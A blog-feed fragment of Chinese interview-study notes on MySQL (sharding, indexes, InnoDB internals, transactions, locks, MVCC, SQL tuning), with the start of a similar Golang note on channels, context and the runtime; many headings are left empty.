        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><p>mongodb(<a href="https://www.chaojimake.cn/question_8_88.html" target="_blank" rel="noopener">https://www.chaojimake.cn/question_8_88.html</a>)<br>hbase(<a href="https://www.chaojimake.cn/question_8_349.html" target="_blank" rel="noopener">https://www.chaojimake.cn/question_8_349.html</a>)</p><h2 id="为什么要分库"><a href="#为什么要分库" class="headerlink" title="为什么要分库"></a>为什么要分库</h2><p>如果业务量剧增，数据库可能会出现性能瓶颈，这时候我们就需要考虑拆分数据库。</p><ul><li><strong>磁盘存储</strong><br>业务量剧增，MySQL单机磁盘容量会撑爆，拆成多个数据库，磁盘使用率大大降低。</li><li><strong>并发连接支撑</strong><br>知道数据库连接数是有限的（150个？）。在高并发的场景下，大量请求访问数据库，MySQL单机是扛不住的！高并发场景下，会出现too many connections报错。</li></ul><p>当前非常火的微服务架构出现，就是为了应对高并发。它把订单、用户、商品等不同模块，拆分成多个应用，并且把单个数据库也拆分成多个不同功能模块的数据库（订单库、用户库、商品库），以分担读写压力。</p><h2 id="为什么要分表"><a href="#为什么要分表" class="headerlink" title="为什么要分表"></a>为什么要分表</h2><p>假如你的单表数据量非常大，存储和查询的性能就会遇到瓶颈了，如果你做了很多优化之后还是无法提升效率的时候，就需要考虑做分表了。一般千万级别数据量，就需要分表。<br>这是因为即使SQL命中了索引，如果表的数据量超过一千万的话，查询也是会明显变慢的。这是因为索引一般是B+树结构，数据千万级别的话，B+树的高度会增高，查询就变慢啦</p><h2 id="考虑分库分表的时机"><a href="#考虑分库分表的时机" class="headerlink" title="考虑分库分表的时机"></a>考虑分库分表的时机</h2><p>一般数据量千万级别，B+树索引高度就会到3层以上了，查询的时候会多查磁盘的次数，SQL就会变慢。</p><p>阿里巴巴的《Java开发手册》提出：<br><strong>单表行数超过500万行或者单表容量超过2GB，才推荐进行分库分表</strong>。<br>那我们是不是等到数据量到达五百万，才开始分库分表呢？<br>不是这样的，我们应该提前规划分库分表，如果估算3年后，你的表都不会到达这个五百万，则不需要分库分表。<br>MySQL服务器如果配置更好，是不是可以超过这个500万这个量级，才考虑分库分表？<br>虽然配置更好，可能数据量大之后，性能还是不错，但是如果持续发展的话，还是要考虑分库分表<br>一般什么类型业务表需要才分库分表？<br>通用是一些流水表、用户表等才考虑分库分表，如果是一些配置类的表，则完全不用考虑，因为不太可能到达这个量级。</p><h2 id="如何分库分表？原则有哪些"><a href="#如何分库分表？原则有哪些" class="headerlink" title="如何分库分表？原则有哪些"></a>如何分库分表？原则有哪些</h2><h2 id="数据库垂直切分"><a href="#数据库垂直切分" class="headerlink" title="数据库垂直切分"></a>数据库垂直切分</h2><h2 id="数据库水平切分"><a href="#数据库水平切分" class="headerlink" title="数据库水平切分"></a>数据库水平切分</h2><h2 id="一定规则"><a href="#一定规则" class="headerlink" title="一定规则"></a>一定规则</h2><h2 id="分库分表的取模算法"><a href="#分库分表的取模算法" class="headerlink" title="分库分表的取模算法"></a>分库分表的取模算法</h2><h2 id="分库分表的范围限定算法"><a href="#分库分表的范围限定算法" class="headerlink" title="分库分表的范围限定算法"></a>分库分表的范围限定算法</h2><h2 id="分库后，事务问题如何解决"><a href="#分库后，事务问题如何解决" class="headerlink" title="分库后，事务问题如何解决"></a>分库后，事务问题如何解决</h2><h2 id="分表后，跨节点的join和union问题"><a href="#分表后，跨节点的join和union问题" class="headerlink" title="分表后，跨节点的join和union问题"></a>分表后，跨节点的join和union问题</h2><h2 id="分库分表后，orderby-groupby等聚合函数如何处理"><a href="#分库分表后，orderby-groupby等聚合函数如何处理" class="headerlink" title="分库分表后，orderby groupby等聚合函数如何处理"></a>分库分表后，orderby groupby等聚合函数如何处理</h2><h2 id="分库分表后，分页的处理方案"><a href="#分库分表后，分页的处理方案" class="headerlink" title="分库分表后，分页的处理方案"></a>分库分表后，分页的处理方案</h2><h2 id="如何生成全局唯一的分布式ID"><a href="#如何生成全局唯一的分布式ID" class="headerlink" title="如何生成全局唯一的分布式ID"></a>如何生成全局唯一的分布式ID</h2><h2 id="主流分库分表中间件"><a href="#主流分库分表中间件" class="headerlink" title="主流分库分表中间件"></a>主流分库分表中间件</h2><h2 id="分表要停服吗，不停服怎么做"><a href="#分表要停服吗，不停服怎么做" class="headerlink" title="分表要停服吗，不停服怎么做"></a>分表要停服吗，不停服怎么做</h2><h2 id="为了避免数据热点问题如何选择分表策略"><a href="#为了避免数据热点问题如何选择分表策略" class="headerlink" title="为了避免数据热点问题如何选择分表策略"></a>为了避免数据热点问题如何选择分表策略</h2><h2 id="阐述常用的数据库中间件"><a href="#阐述常用的数据库中间件" class="headerlink" title="阐述常用的数据库中间件"></a>阐述常用的数据库中间件</h2><h1 id="基础问题"><a href="#基础问题" class="headerlink" title="基础问题"></a>基础问题</h1><h2 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1. 数据类型"></a>1. 数据类型</h2><ul><li>int：tinyint(1byte) smallint(2byte)  mediumint(3byte)  int(4byte)  bigint(8byte) </li><li>float,double</li><li>decimal</li></ul><p><strong>字符串类型：varchar,char,text,blob</strong> </p><ul><li>varchar(n):n代表字符个数，不是字节个数</li><li>char与varchar的区别<ul><li>char定长，var不定长，存储效率较高</li><li>varchar在开头两个字节存长度</li></ul></li><li>text 和blob会使用临时表，开销损失大<br>【Tips】经常变更的数据使用char，char不容易产生碎片</li></ul><p><strong>时间类型</strong></p><ul><li><p>date</p></li><li><p>timestamp（优先使用，空间开销小）</p><h2 id="3-数据库三大范式-，范式和反范式是什么"><a href="#3-数据库三大范式-，范式和反范式是什么" class="headerlink" title="3. 数据库三大范式 ，范式和反范式是什么"></a>3. 数据库三大范式 ，范式和反范式是什么</h2></li><li><p>第一范式（1NF）：每个列都不可以再拆分，强调的是列的原子性。第一范式要求数据库中的表都是二维表。</p></li><li><p>第二范式（2NF）：在第一范式的基础上，一个表必须有一个主键，非主键列 完全依赖 于主键，而不能是依赖于主键的一部分。</p></li><li><p>第三范式（3NF）：在第二范式的基础上，非主键列只依赖（直接依赖）于主键，不依赖于其他非主键。</p></li><li><p><strong>范式</strong>：范式化的表减少了数据冗余，数据表更新操作快、占用存储空间少。    </p></li><li><p>但是查询时通常需要多表关联查询，更难进行索引优化</p></li><li><p><strong>反范式</strong>：反范式的过程就是通过冗余数据来提高查询性能，可以减少表关联和更好进行索引优化</p></li><li><p>存在大量冗余数据，并且数据的维护成本更高</p></li></ul><h1 id="索引问题"><a href="#索引问题" class="headerlink" title="索引问题"></a>索引问题</h1><h2 id="1-索引的分类"><a href="#1-索引的分类" class="headerlink" title="1.索引的分类"></a>1.索引的分类</h2><h2 id="2-索引优缺点"><a href="#2-索引优缺点" class="headerlink" title="2.索引优缺点"></a>2.索引优缺点</h2><h2 id="3-索引设计原则"><a href="#3-索引设计原则" class="headerlink" title="3.索引设计原则"></a>3.索引设计原则</h2><ul><li><p>唯一性</p></li><li><p>选择常用的字段</p></li><li><p>选用经常排序、分组、联合的字段</p></li><li><p>小表不建议索引（几万这种不需要，，几十万这种看情况）</p><h2 id="4-索引的b-树"><a href="#4-索引的b-树" class="headerlink" title="4.索引的b+树"></a>4.索引的b+树</h2><h2 id="5-hash索引和b-索引的区别"><a href="#5-hash索引和b-索引的区别" class="headerlink" title="5.hash索引和b+索引的区别"></a>5.hash索引和b+索引的区别</h2><h2 id="6-为什么b-树打败了二叉查找树和b树"><a href="#6-为什么b-树打败了二叉查找树和b树" class="headerlink" title="6.为什么b+树打败了二叉查找树和b树"></a>6.为什么b+树打败了二叉查找树和b树</h2><h2 id="7-最左匹配原则"><a href="#7-最左匹配原则" class="headerlink" title="7.最左匹配原则"></a>7.最左匹配原则</h2><h2 id="8-覆盖索引"><a href="#8-覆盖索引" class="headerlink" title="8.覆盖索引"></a>8.覆盖索引</h2><h2 id="9-索引下推"><a href="#9-索引下推" class="headerlink" title="9.索引下推"></a>9.索引下推</h2><h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><p>InnoDB 适用于？<br>MyISAM 适用以插入为主的程序，比如博客系统、新闻门户</p><h2 id="1-存储引擎InnoDB的四大特性"><a href="#1-存储引擎InnoDB的四大特性" class="headerlink" title="1.存储引擎InnoDB的四大特性"></a>1.存储引擎InnoDB的四大特性</h2><p>插入缓冲（insert buffer)<br>二次写(double write)<br>自适应哈希索引(ahi)<br>预读(read ahead)</p><h2 id="2-MyISAM和InnoDB的区别"><a href="#2-MyISAM和InnoDB的区别" class="headerlink" title="2.MyISAM和InnoDB的区别"></a>2.MyISAM和InnoDB的区别</h2></li><li><p>InnoDB 支持事务，而 MyISAM 不支持。</p></li><li><p>InnoDB 支持外键，而 MyISAM 不支持。因此将一个含有外键的 InnoDB 表 转为 MyISAM 表会失败。</p></li><li><p>InnoDB 和 MyISAM 均支持 B+ Tree 数据结构的索引。但 InnoDB 是聚集索引，而 MyISAM 是非聚集索引。</p></li><li><p>InnoDB 不保存表中数据行数，执行 select count(*) from table 时需要全表扫描。而 MyISAM 用一个变量记录了整个表的行数，速度相当快（注意不能有 WHERE 子句）。</p></li></ul><p><strong>那为什么 InnoDB 没有使用这样的变量呢</strong> 因为InnoDB的事务特性，在同一时刻表中的行数对于不同的事务而言是不一样的。</p><ul><li><p>InnoDB 支持表、行（默认）级锁，而 MyISAM 支持表级锁。<br>InnoDB 的行锁是基于索引实现的，而不是物理行记录上。即访问如果没有命中索引，则也无法使用行锁，将要退化为表锁。</p></li><li><p>InnoDB 必须有唯一索引（如主键），如果没有指定，就会自动寻找或生产一个隐藏列 Row_id 来充当默认主键，而 Myisam 可以没有主键。</p><h2 id="3-为何推荐使用自增主键"><a href="#3-为何推荐使用自增主键" class="headerlink" title="3.为何推荐使用自增主键"></a>3.为何推荐使用自增主键</h2><p>自增 ID 可以保证每次插入时 B+ 树索引是从右边扩展的，因此相比自定义 ID （如 UUID）可以避免 B+ 树的频繁合并和分裂。如果使用字符串主键和随机主键，会使得数据随机插入，效率比较差。</p><h1 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h1><h2 id="1-页Page，区Extend，段Segment"><a href="#1-页Page，区Extend，段Segment" class="headerlink" title="1.页Page，区Extend，段Segment"></a>1.页Page，区Extend，段Segment</h2></li></ul><p><strong>页（数据页）：InnoDB中每个页16KB，Myisam是1KB</strong></p><h3 id="一行数据大于16kb，会发生什么，怎么解决【行溢出问题】"><a href="#一行数据大于16kb，会发生什么，怎么解决【行溢出问题】" class="headerlink" title="一行数据大于16kb，会发生什么，怎么解决【行溢出问题】"></a>一行数据大于16kb，会发生什么，怎么解决【行溢出问题】</h3><p>内置的解决方式：将溢出的数据存到新页里，然后原始页里存放一个指针，需要额外一次IO去读取</p><p>聚簇索引情况：</p><ul><li>如果表使用了聚簇索引（InnoDB的主键索引就是一个聚簇索引），那么数据行实际上是存储在聚簇索引的叶子节点中的。如果一行数据超出了页的大小，那么会发生行溢出，溢出部分会存储在一个溢出页中，而叶子节点中仍然包含原始行的数据和指向溢出页的指针。</li></ul><p>非聚簇索引情况：</p><ul><li>如果表使用了非聚簇索引（如普通索引），那么数据行是单独存储在聚簇索引的叶子节点之外的，这种情况下，如果一行数据超出了页的大小，会直接发生行溢出，溢出部分会存储在溢出页中，同时非聚簇索引中也会保留指向溢出页的指针。</li></ul><p><strong>区Extent：一个区默认是 64 个连续的页组成的，也就是 1MB</strong></p><p><strong>段Segment：一段相邻的区的集合，逻辑上的组织，存放b+树</strong></p><h2 id="2-页由哪些数据组成"><a href="#2-页由哪些数据组成" class="headerlink" title="2.页由哪些数据组成"></a>2.页由哪些数据组成</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/mysqlpagestructure.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>file header:用于描述数据页的外部信息，比如属于哪一个表空间、前后页的页号等</li><li>page header:用来描述数据页中的具体信息，比如存在多少条纪录，第一条纪录的位置等。</li><li>infimum 和 supremum 纪录:是系统生成的纪录，分别为最小和最大纪录值，infimum 的下一条是用户纪录中键值最小的纪录，supremum 的上一条是用户纪录中键值最大的纪录，通过 next_record 字段来相连。</li><li>user records:据库表中对应的数据(Compact行格式)</li><li>free space 可插入的空闲区域</li><li>page dictionary：类似于字典的目录结构，根据主键大小，每隔 4-8 个纪录设置一个槽，用来纪录其位置，当根据主键查找数据时，首先一步到位找到数据所在的槽，然后在槽中线性搜素。这种方法比从前到后遍历页的链表的效率更快。</li><li>File Header：存储刷盘前内存的校验和，Page Tailer储存刷盘后的校验和。当刷盘的时候，出现异常，Page Tailer和File Header中的校验和不一致，则说明出现刷盘错误。</li></ul><h2 id="3-页插入记录的过程"><a href="#3-页插入记录的过程" class="headerlink" title="3.页插入记录的过程"></a>3.页插入记录的过程</h2><p>1）如果 Free Space 的空间足够的话，直接分配空间来添加纪录，并将插入前最后一条纪录的 next_record 指向当前插入的纪录，将当前插入纪录的 next_record 指向 supremum 纪录。</p><p>2）如果 Free Space的 空间不够的话，则首先将之前删除造成的碎片重新整理之后，按照上述步骤插入纪录。</p><p>3）如果当前页空间整理碎片之后仍然不足的话，则重新申请一个页，将页初始化之后，按照上述步骤插入纪录</p><h2 id="4-bufferPool"><a href="#4-bufferPool" class="headerlink" title="4.bufferPool"></a>4.bufferPool</h2><p>Buffer Pool 是 InnoDB 存储引擎层的缓冲池，不属于 MySQL 的 Server 层，注意跟 8.0 删掉的“查询缓存”功能区分。</p><p>内存中以页（page）为单位缓存磁盘数据，减少磁盘IO，提升访问速度。缓冲池大小默认 128M，独立的 MySQL 服务器推荐设置缓冲池大小为总内存的 80%。主要存储数据页、索引页更新缓冲（change buffer）等。</p><h2 id="5-change-buffer"><a href="#5-change-buffer" class="headerlink" title="5.change buffer"></a>5.change buffer</h2><p>​如果每次写操作，数据库都直接更新磁盘中的数据，会很占磁盘IO。为了减少磁盘IO，InnoDB在Buffer Pool中开辟了一块内存，用来存储变更记录，为了防止异常宕机丢失缓存，当事务提交时会将变更记录持久化到磁盘（redo log），等待时机更新磁盘的数据文件（刷脏），用来缓存写操作的内存，就是Change Buffer</p><p>Change Buffer默认占Buffer Pool的25%，最大设置占用50%。</p><h1 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h1><h2 id="1-架构设计【内存、线程】"><a href="#1-架构设计【内存、线程】" class="headerlink" title="1.架构设计【内存、线程】"></a>1.架构设计【内存、线程】</h2><ul><li>内存数据区域划分<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/Innodbmem.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>四大线程<ul><li>Master thread</li><li>IO thread</li><li>Purge thread</li><li>Page Cleaner Thread</li></ul></li></ul><p>1）负责刷新内存池中的数据，保证缓冲池的内存缓冲的是最近的数据</p><p>2）已修改的数据文件刷新到磁盘文件</p><p>3）保证数据库发生异常的情况下InnoDB能恢复到正常状态</p><h2 id="2-InnoDB有哪些线程"><a href="#2-InnoDB有哪些线程" class="headerlink" title="2.InnoDB有哪些线程"></a>2.InnoDB有哪些线程</h2><ul><li>Master Thread</li></ul><p>负责将缓冲池中的数据异步刷新到磁盘，保证数据的一致性，包括脏页的刷新，合并插入缓冲（INSERT BUFFER），UNDO页的回收等。</p><ul><li>IO Thread</li></ul><p>负责 AIO 请求的回调处理。</p><ul><li>Purge Thread</li></ul><p>事务提交后，undo log 可能不再需要，由 Purge Thread 负责回收并重新分配的这些已经使用的 undo 页。</p><ul><li>Page Cleaner Thread</li></ul><p>将Master Threader中刷新脏页的工作移至该线程，如上面说的FLUSH LRU LIST Checkpoint以及Async/Sync Flush Checkpoint。</p><h2 id="3-double-writer是什么"><a href="#3-double-writer是什么" class="headerlink" title="3.double writer是什么"></a>3.double writer是什么</h2><h2 id="4-自适应hash是什么"><a href="#4-自适应hash是什么" class="headerlink" title="4. 自适应hash是什么"></a>4. 自适应hash是什么</h2><p>InnoDB 会监控对表上各索引页的查询执行情况，如发现建立哈希索引可以提升速度，则建立哈希索引，这是过程不需要用户干预。（默认开启）</p><h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><h2 id="1-什么是事务"><a href="#1-什么是事务" class="headerlink" title="1.什么是事务"></a>1.什么是事务</h2><p>事务是逻辑上的一组操作，要么都执行，要么都不执行</p><h2 id="2-什么是事务的四大特性ACID"><a href="#2-什么是事务的四大特性ACID" class="headerlink" title="2.什么是事务的四大特性ACID"></a>2.什么是事务的四大特性ACID</h2><h2 id="3-事务的并发问题【带来脏读、不可重复度、幻读问题】"><a href="#3-事务的并发问题【带来脏读、不可重复度、幻读问题】" class="headerlink" title="3.事务的并发问题【带来脏读、不可重复度、幻读问题】"></a>3.事务的并发问题【带来脏读、不可重复度、幻读问题】</h2><h2 id="5-事务的隔离级别"><a href="#5-事务的隔离级别" class="headerlink" title="5.事务的隔离级别"></a>5.事务的隔离级别</h2><p>串行化<br>可重复度（Innodb默认）<br>读已提交<br>读未提交</p><h2 id="6-ACID的特性如何实现"><a href="#6-ACID的特性如何实现" class="headerlink" title="6.ACID的特性如何实现"></a>6.ACID的特性如何实现</h2><p>原子性是 undo 日志<br>持久性是 redo 日志</p><h1 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h1><h2 id="1-数据库锁的特性，有哪些锁"><a href="#1-数据库锁的特性，有哪些锁" class="headerlink" title="1.数据库锁的特性，有哪些锁"></a>1.数据库锁的特性，有哪些锁</h2><ul><li>行锁，表锁，页锁</li><li>共享锁=读锁S，排他锁=写锁X，更新锁U锁</li><li>乐观锁，悲观锁<h2 id="2-隔离级别和锁的关系"><a href="#2-隔离级别和锁的关系" class="headerlink" title="2.隔离级别和锁的关系"></a>2.隔离级别和锁的关系</h2></li><li><h2 id="3-InnoDB的锁算法"><a href="#3-InnoDB的锁算法" class="headerlink" title="3.InnoDB的锁算法"></a>3.InnoDB的锁算法</h2><h2 id="4-快照读和当前读"><a href="#4-快照读和当前读" class="headerlink" title="4.快照读和当前读"></a>4.快照读和当前读</h2><h2 id="5-innodb的可重复度如何实现"><a href="#5-innodb的可重复度如何实现" class="headerlink" title="5.innodb的可重复度如何实现"></a>5.innodb的可重复度如何实现</h2>通过MVCC实现，为每个事务维护一个独立版本视图，执行期间保持一致性。<h2 id="6-MVCC以及实现（乐观锁）"><a href="#6-MVCC以及实现（乐观锁）" class="headerlink" title="6.MVCC以及实现（乐观锁）"></a>6.MVCC以及实现（乐观锁）</h2>MVCC 的基本思想是为每个事务创建一个独立的版本视图，以便在事务执行期间保持数据的一致性。它通过在修改数据时不覆盖原有的数据，而是为每个事务创建一个新的版本来实现。</li></ul><ol><li>每行数据保存一个版本号/时间戳</li><li>当一个事务对某行数据进行修改时，不会直接修改原始数据，而是会在数据库中创建一个新的版本，并将原始版本的数据保留下来</li><li>查询时，根据版本号<h2 id="7-mysql优化手段有哪些"><a href="#7-mysql优化手段有哪些" class="headerlink" title="7. mysql优化手段有哪些"></a>7. mysql优化手段有哪些</h2></li><li>给常用字段索引</li><li>避免使用select *，避免全表扫描</li><li>分表，分区，拆分子表</li><li>使用覆盖索引：索引覆盖是指查询的列都包含在索引中，而无需再去访问表本身，可以减少IO和提高查询性能。<strong>不适合频繁变更的表和列</strong></li><li>redis缓存分担压力</li><li>连接池等<h1 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h1><h2 id="1-mysql的常见日志"><a href="#1-mysql的常见日志" class="headerlink" title="1.mysql的常见日志"></a>1.mysql的常见日志</h2></li></ol><h2 id="2-主从复制的作用"><a href="#2-主从复制的作用" class="headerlink" title="2.主从复制的作用"></a>2.主从复制的作用</h2><h2 id="3-主从复制的架构"><a href="#3-主从复制的架构" class="headerlink" title="3.主从复制的架构"></a>3.主从复制的架构</h2><h2 id="4-主从复制的原理"><a href="#4-主从复制的原理" class="headerlink" title="4.主从复制的原理"></a>4.主从复制的原理</h2><h2 id="5-主从复制的异步复制和半同步"><a href="#5-主从复制的异步复制和半同步" class="headerlink" title="5.主从复制的异步复制和半同步"></a>5.主从复制的异步复制和半同步</h2><h2 id="6-主从的常见问题和解决方式"><a href="#6-主从的常见问题和解决方式" class="headerlink" title="6.主从的常见问题和解决方式"></a>6.主从的常见问题和解决方式</h2><p>主从延迟问题，不一致性问题<br><a href="https://zhuanlan.zhihu.com/p/642614348" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/642614348</a></p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="1-Where和Having的区别"><a href="#1-Where和Having的区别" class="headerlink" title="1.Where和Having的区别"></a>1.Where和Having的区别</h2><h2 id="2-In-和-Exists的区别"><a href="#2-In-和-Exists的区别" class="headerlink" title="2.In 和 Exists的区别"></a>2.In 和 Exists的区别</h2><h2 id="3-Union和Union-ALL的区别"><a href="#3-Union和Union-ALL的区别" class="headerlink" title="3. Union和Union ALL的区别"></a>3. Union和Union ALL的区别</h2><h2 id="4-Drop-Delete-Truncate的区别"><a href="#4-Drop-Delete-Truncate的区别" class="headerlink" title="4. Drop Delete Truncate的区别"></a>4. Drop Delete Truncate的区别</h2><h1 id="SQL优化"><a href="#SQL优化" class="headerlink" title="SQL优化"></a>SQL优化</h1><h2 id="1-如何判断是否走了索引"><a href="#1-如何判断是否走了索引" class="headerlink" title="1. 如何判断是否走了索引"></a>1. 如何判断是否走了索引</h2><h2 id="2-索引失效的几种情况"><a href="#2-索引失效的几种情况" class="headerlink" title="2. 索引失效的几种情况"></a>2. 索引失效的几种情况</h2><h2 id="3-where子句如何优化"><a href="#3-where子句如何优化" class="headerlink" title="3. where子句如何优化"></a>3. where子句如何优化</h2><h2 id="4-超大分页和深度分页"><a href="#4-超大分页和深度分页" class="headerlink" title="4. 超大分页和深度分页"></a>4. 超大分页和深度分页</h2><h2 id="5-大表查询如何优化"><a href="#5-大表查询如何优化" class="headerlink" title="5. 大表查询如何优化"></a>5. 大表查询如何优化</h2><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="1-存储过程（procedure）和函数的区别"><a href="#1-存储过程（procedure）和函数的区别" class="headerlink" title="1.存储过程（procedure）和函数的区别"></a>1.存储过程（procedure）和函数的区别</h2><h2 id="2-视图是什么"><a href="#2-视图是什么" class="headerlink" title="2.视图是什么"></a>2.视图是什么</h2><h2 id="3-Trigger是什么"><a href="#3-Trigger是什么" class="headerlink" title="3.Trigger是什么"></a>3.Trigger是什么</h2><h2 id="sql优化的经验"><a href="#sql优化的经验" class="headerlink" title="sql优化的经验"></a>sql优化的经验</h2><ol><li>查询字段不使用函数或者大于等于表达式</li><li>避免where中的不等于，大于小于，null等</li><li>使用between and 替代in</li><li>当操作字段规模大的时候，拆分delete和insert语句</li><li>查询时使用索引的最左前缀原则</li></ol><h2 id="使用-union-和-union-all-时需要注意些什么"><a href="#使用-union-和-union-all-时需要注意些什么" class="headerlink" title="使用 union 和 union all 时需要注意些什么?"></a>使用 union 和 union all 时需要注意些什么?</h2><p>通过 union 连接的 SQL 分别单独取出的列数必须相同。 使用 union 时，多个相等的行将会被合并，由<br>于合升比较耗时，一般不直接使 用 union 进行合并，而是通常采用 union all 进行合并。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang questions</title>
      <link href="/2023/01/02/2023-01-02-%E9%9D%A2%E7%BB%8FGo%E9%97%AE%E9%A2%98/"/>
      <url>/2023/01/02/2023-01-02-%E9%9D%A2%E7%BB%8FGo%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>Golang questions</p><a id="more"></a><p>利用通信，也就是封装内部实现，提供接口的方式来进行相应的操作</p><h2 id="讲讲go程序的执行过程：预处理，编译、链接、运行"><a href="#讲讲go程序的执行过程：预处理，编译、链接、运行" class="headerlink" title="讲讲go程序的执行过程：预处理，编译、链接、运行"></a>讲讲go程序的执行过程：预处理，编译、链接、运行</h2><p>词法分析、语法分析、类型检查、代码生成、编译器优化、链接</p><ul><li>go run做了什么：编译、链接、运行<h2 id="channel和共享内存有什么优劣"><a href="#channel和共享内存有什么优劣" class="headerlink" title="channel和共享内存有什么优劣"></a>channel和共享内存有什么优劣</h2>channel</li><li>隐式同步，减少锁的使用</li><li>不适合大量数据传输<br>共享内存</li><li>显式用锁，性能高</li><li>适合大量数据，但难以调试，存在复杂的同步机制<h2 id="context原理和场景【并发安全的】"><a href="#context原理和场景【并发安全的】" class="headerlink" title="context原理和场景【并发安全的】"></a>context原理和场景【并发安全的】</h2>【withtimeout超时取消，withvalue传递共享数据】<br>context用于多个goroutine之间进行通信和控制的官方库，实现并发控制，包括取消信号、控制超时时间<br>注意点</li></ul><ol><li>不要将 Context 塞到结构体里。直接将 Context 类型作为函数的第一参数，而且一般都命名为 ctx。</li><li>不要向函数传入一个 nil 的 context，如果你实在不知道传什么，标准库给你准备好了一个 context：todo。</li><li>不要把本应该作为函数参数的类型塞到 context 中，context 存储的应该是一些共同的数据。例如：登陆的 session、cookie 等。</li></ol><p>ctx, cancel := context.WithCancel(context.Background())<br>defer cancel() // 避免其他地方忘记 cancel，且重复调用不影响</p><h3 id="原理，COntext-Value查找"><a href="#原理，COntext-Value查找" class="headerlink" title="原理，COntext.Value查找"></a>原理，COntext.Value查找</h3><p>Context 指向它的父节点，链表则指向下一个节点。通过 WithValue 函数，可以创建层层的 valueCtx，存储 goroutine 间可以共享的变量。<br>取值的过程，实际上是一个递归查找的过程，它会顺着链路一直往上找，比较当前节点的 key是否是要找的 key，如果是，则直接返回 value。否则，一直顺着 context 往前，最终找到根节点（一般是 emptyCtx），直接返回一个 nil。所以用 Value 方法的时候要判断结果是否为 nil。<br>父节点没法获取子节点存储的值，子节点却可以获取父节点的值。</p><h2 id="waitgroup的原理和场景【多个groutine的等待结束-并发控制】"><a href="#waitgroup的原理和场景【多个groutine的等待结束-并发控制】" class="headerlink" title="waitgroup的原理和场景【多个groutine的等待结束/并发控制】"></a>waitgroup的原理和场景【多个groutine的等待结束/并发控制】</h2><ul><li>内部维护了一个计数器，初始化为0。</li><li>调用 Add 方法时，计数器会增加；</li><li>每当调用 Done 方法时，计数器会减少；</li><li>调用 Wait 方法时，如果计数器不为零，则会阻塞当前 Goroutine，直到计数器减至零。</li></ul><h2 id="string和byte的转换发生内存拷贝吗【会】为什么？"><a href="#string和byte的转换发生内存拷贝吗【会】为什么？" class="headerlink" title="string和byte的转换发生内存拷贝吗【会】为什么？"></a>string和byte的转换发生内存拷贝吗【会】为什么？</h2><p>string底层是一个不可变的字符数组，执行[]byte(str)，拷贝完，之前分配的空间被gc</p><h2 id="为什么go协程堵掉不会阻塞，C-的线程堵掉"><a href="#为什么go协程堵掉不会阻塞，C-的线程堵掉" class="headerlink" title="为什么go协程堵掉不会阻塞，C++的线程堵掉"></a>为什么go协程堵掉不会阻塞，C++的线程堵掉</h2><p>【C++的线程pthread是内核态，Go的调度时runtime系统管理的，相当于套了一层壳，运行在用户态，但是有内核态的速度】</p><h2 id="除了mutex还有什么方法实现并发安全"><a href="#除了mutex还有什么方法实现并发安全" class="headerlink" title="除了mutex还有什么方法实现并发安全"></a>除了mutex还有什么方法实现并发安全</h2><p>atomic包和channel</p><h2 id="这个runtime系统解释一下"><a href="#这个runtime系统解释一下" class="headerlink" title="这个runtime系统解释一下"></a>这个runtime系统解释一下</h2><p>golang 的 runtime 在 golang 中的地位类似于 Java 的虚拟机。<br>包括</p><ol><li>GPM模型</li><li>GC机制</li><li>内存分配：Go 程序在启动时，会首先向系统申请一块内存(虚拟地址空间)，然后自己切成小块进行管理. 将申请的内存，分成 3 个区域,spans、bitmap、arena<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arena: 就是堆区，go runtime 在动态分配的内存都在这个区域，并且将内存块分成 8kb 的页，一些组合起来的称为 **mspan，**成为 go 中内存管理的基本单元，这种连续的页一般是操作系统的内存页几倍大小.</span><br><span class="line">bitmap: 顾名思义，用来标记堆区使用的映射表，它记录了哪些区域保存了对象，对象是否包含指针，以及 GC 的标记信息.</span><br><span class="line">spans: 存放 mspan 的指针，根据 spans 区域的信息可以很容易找到 mspan. 它可以在 GC 时更快速的找到的大块的内存 mspan.</span><br></pre></td></tr></table></figure></li></ol><h2 id="为什么要用协程，好处是什么"><a href="#为什么要用协程，好处是什么" class="headerlink" title="为什么要用协程，好处是什么"></a>为什么要用协程，好处是什么</h2><p>go的协程是为了解决多核CPU利用率问题，go语言层面并不支持多进程或多线程，但是协程更好用，<strong>协程被称为用户态线程</strong>，不存在CPU上下文切换问题，效率非常高。几乎所有IO密集型的应用，都可以利用协程提高速度</p><h2 id="1-go的数组和切片"><a href="#1-go的数组和切片" class="headerlink" 